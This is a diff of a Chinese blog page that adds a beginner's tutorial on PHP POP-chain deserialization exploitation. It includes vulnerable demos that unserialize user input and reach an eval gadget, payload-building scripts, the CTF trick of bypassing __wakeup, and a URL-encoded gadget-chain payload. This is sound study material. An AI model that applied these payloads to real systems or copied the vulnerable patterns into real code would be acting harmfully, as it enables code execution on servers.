@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="pop链, 书鱼">
-    <meta name="description" content="pop链 | 书鱼">
+    <meta name="keywords" content="萌新入门pop链, 书鱼">
+    <meta name="description" content="一、POP?ROP?面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>pop链 | 书鱼</title>
+    <title>萌新入门pop链 | 书鱼</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -231,13 +231,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        pop链
+                        萌新入门pop链
                     </div>
                 </div>
             </div>
@@ -383,14 +383,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    8 分
                 </div>
                 
 				
@@ -406,7 +406,256 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="一、POP-ROP"><a href="#一、POP-ROP" class="headerlink" title="一、POP?ROP?"></a>一、POP?ROP?</h2><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p>
+<p>ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集<br>POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<code>进行反序列化的数据能够被用户输入所控制。</code></p>
+<h2 id="二、初级利用"><a href="#二、初级利用" class="headerlink" title="二、初级利用"></a>二、初级利用</h2><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。<br>举例<br>demo.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">lemon</span> <span class="token punctuation">{</span>
+    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">normal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">normal</span> <span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">evil</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>crack.php</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+
+<span class="token keyword">class</span> <span class="token class-name">lemon</span> <span class="token punctuation">{</span>
+    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>
+    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">evil</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token variable">$data</span><span class="token operator">=</span><span class="token string">"phpinfo();"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">lemon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span> </code></pre>
+<p><img src="1.png" alt=""><br>protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。</p>
+<h2 id="三、中级利用，当然这个没有链的感觉，所以看下面例子就长一点，利用了魔法函数"><a href="#三、中级利用，当然这个没有链的感觉，所以看下面例子就长一点，利用了魔法函数" class="headerlink" title="三、中级利用，当然这个没有链的感觉，所以看下面例子就长一点，利用了魔法函数"></a>三、中级利用，当然这个没有链的感觉，所以看下面例子就长一点，利用了魔法函数</h2><h3 id="先解释几个魔法函数"><a href="#先解释几个魔法函数" class="headerlink" title="先解释几个魔法函数"></a>先解释几个魔法函数</h3><p><code>__call</code>, <code>__invoke</code>, <code>__toString</code>, <code>__wakeup()</code>,<code>__sleep()</code><br>更多参考<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
+<h4 id="1-call"><a href="#1-call" class="headerlink" title="1. __call()"></a>1. __call()</h4><p>PHP5 的对象新增了一个专用方法 <strong>call()，这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在或被权限控制中的方法，</strong>call 方法将会被自动调用。<br>demo</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">class</span> <span class="token class-name">A</span>
+    <span class="token punctuation">{</span>
+         <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+         <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"a"</span><span class="token punctuation">;</span>
+         <span class="token punctuation">}</span>
+         <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$arguments</span><span class="token punctuation">)</span>
+         <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token string">"调用不存在的方法名是:"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'&lt;br>参数是:'</span><span class="token punctuation">;</span>
+            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>
+         <span class="token punctuation">}</span>
+         <span class="token variable">$ins</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span>
+         <span class="token variable">$ins</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">b</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">//输出结果为 调用不存在的方法名是：b 参数是：Array ( [0] => Array ( [0] => 1 [1] => 2 [2] => 3 ) ) </span></code></pre>
+<h4 id="2-invoke"><a href="#2-invoke" class="headerlink" title="2. __invoke()"></a>2. __invoke()</h4><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。本特性只在 PHP 5.3.0 及以上版本有效</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">CallableClass</span> 
+<span class="token punctuation">{</span>
+    <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CallableClass</span><span class="token punctuation">;</span>
+<span class="token variable">$obj</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>输出</p>
+<pre><code>int(5)
+bool(true)</code></pre><h4 id="3-toString"><a href="#3-toString" class="headerlink" title="3.__toString"></a>3.__toString</h4><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token comment" spellcheck="true">// Declare a simple class</span>
+<span class="token keyword">class</span> <span class="token class-name">TestClass</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token variable">$foo</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$foo</span><span class="token punctuation">)</span> 
+    <span class="token punctuation">{</span>
+        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">foo</span> <span class="token operator">=</span> <span class="token variable">$foo</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">foo</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$class</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestClass</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$class</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">//输出 Hello</span></code></pre>
+<p>需要指出的是在 PHP 5.2.0 之前，__toString() 方法只有在直接使用于 echo 或 print 时才能生效。PHP 5.2.0 之后，则可以在任何字符串环境生效（例如通过 printf()，使用 %s 修饰符），但不能用于非字符串环境（如使用 %d 修饰符）。自 PHP 5.2.0 起，如果将一个未定义 __toString() 方法的对象转换为字符串，会产生 E_RECOVERABLE_ERROR 级别的错误。</p>
+<h4 id="4-wakeup"><a href="#4-wakeup" class="headerlink" title="4.__wakeup()"></a>4.__wakeup()</h4><p><strong>wakeup()是在反序列化操作中起作用的魔法函数，当unserialize的时候，会检查时候存在</strong>wakeup()函数，如果存在的话，会优先调用__wakeup()函数。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name">xctf</span><span class="token punctuation">{</span> 
+    <span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"this is __wakeup()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">xctf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$t</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">//输出this is __wakeup()</span></code></pre>
+<p>ps: <strong>wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么i就调用</strong>wakeup()函数，如果该数字大于真实属性个数，就会绕过__wakeup()函数。</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">xctf</span><span class="token punctuation">{</span>
+<span class="token keyword">public</span> <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+<span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'bad requests'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//这里差个反括号，但是源码确实是这样的。</span>
+<span class="token operator">?</span>code<span class="token operator">=</span></code></pre>
+<p>将上面的要求序列化后为<code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，xctf后有一个数字1，这个1是代表这个类有一个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。<br>如，我们提交<code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code>，将其改为2，得到flag。</p>
+<h4 id="5-construct-destruct"><a href="#5-construct-destruct" class="headerlink" title="5.construct(),destruct()"></a>5.<strong>construct(),</strong>destruct()</h4><p>同c++的构造函数和析构函数</p>
+<h4 id="6-clone"><a href="#6-clone" class="headerlink" title="6.__clone()"></a>6.__clone()</h4><p>克隆对象时被调用。如：<code>$t=new Test()，$t1=clone $t;</code></p>
+<h4 id="7-sleep"><a href="#7-sleep" class="headerlink" title="7.__sleep()"></a>7.__sleep()</h4><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p>
+<h3 id="那再看这个长的demo-第一次看确实很难受，但是理解后会发现真的妙不可言"><a href="#那再看这个长的demo-第一次看确实很难受，但是理解后会发现真的妙不可言" class="headerlink" title="那再看这个长的demo-第一次看确实很难受，但是理解后会发现真的妙不可言~"></a>那再看这个长的demo-第一次看确实很难受，但是理解后会发现真的妙不可言~</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">start_gg</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">Call</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">test2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">CallFunc</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$test2</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$s1</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token punctuation">;</span>
+                <span class="token variable">$s1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">InvokeFunc</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod2</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod2</span> <span class="token operator">=</span> <span class="token string">"字符串拼接"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> 
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">ToStringFunc</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$str1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token variable">$str2</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str1</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">GetFlag</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token keyword">echo</span> <span class="token string">"flag:"</span><span class="token punctuation">.</span><span class="token string">"flag{test}"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'string'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>我们一步一步来处理</p>
+<ol>
+<li>首先要利用class GetFlag中的get_flag,所以我们只要有一个<code>1-ToStringFunc类的实例当字符串来使用</code></li>
+<li>InvokeFunc中使用了字符串拼接可以利用，所以我们只要有一个<code>2-InvokeFunc类的实例，并且str1要是1-ToStringFunc，并且这个类要当函数使用</code></li>
+<li>CallFunc中刚好有一个 $s1();函数调用，所以我们只要有一个<code>3-CallFunc类的实例，并且mod1要是2-InvokeFunc，并且要调用一次不存在的函数</code></li>
+<li>Call中刚好有一个test2函数调用，并且不存在，所以我们只要一个<code>4-Call的类的实例，并且mod1要是3-CallFunc</code></li>
+<li>最后需要一个自动函数调用的方法，刚好start_gg有一个析构函数，所以我们只要一个<code>5-startgg类的实例，并且mod1要是4-call</code></li>
+</ol>
+<p>完美~这就是艺术<br>ps:<code>protected $ClassObj = new evil();是不行的，还是通过__construct来实例化。</code><br>在序列化之前只调用__construct函数，并且序列化将对象转换成字符串，仅保留对象里的成员变量，不保留函数方法。<br>所以构造的时候只要记录我们需要的属性+构造函数即可</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name">GetFlag</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token keyword">echo</span> <span class="token string">"flag:"</span><span class="token punctuation">.</span><span class="token string">"flag{Test}"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">ToStringFunc</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$str1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">GetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">InvokeFunc</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">CallFunc</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">InvokeFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">Call</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">CallFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>     
+<span class="token punctuation">}</span>
+<span class="token keyword">class</span> <span class="token class-name">start_gg</span>
+<span class="token punctuation">{</span>
+        <span class="token keyword">public</span> <span class="token variable">$mod1</span><span class="token punctuation">;</span>
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mod1</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Call</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>     
+<span class="token punctuation">}</span>
+<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">start_gg</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//构造start_gg类对象$b</span>
+<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>输出<br><code>O%3A8%3A%22start_gg%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A4%3A%22Call%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A8%3A%22CallFunc%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A10%3A%22InvokeFunc%22%3A1%3A%7Bs%3A4%3A%22mod1%22%3BO%3A12%3A%22ToStringFunc%22%3A1%3A%7Bs%3A4%3A%22str1%22%3BO%3A7%3A%22GetFlag%22%3A0%3A%7B%7D%7D%7D%7D%7D%7D</code><br><img src="2.png" alt=""><br>秒啊</p>
+
             </div>
             <hr/>
 
@@ -520,15 +769,15 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="pop链">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="萌新入门pop链">
                         
-                        <span class="card-title">pop链</span>
+                        <span class="card-title">萌新入门pop链</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            一、POP?ROP?面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环
                         
                     </div>
                     <div class="publish-info">
@@ -751,7 +1000,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">152k</span>&nbsp;字
+                class="white-color">153.9k</span>&nbsp;字
             
             
             
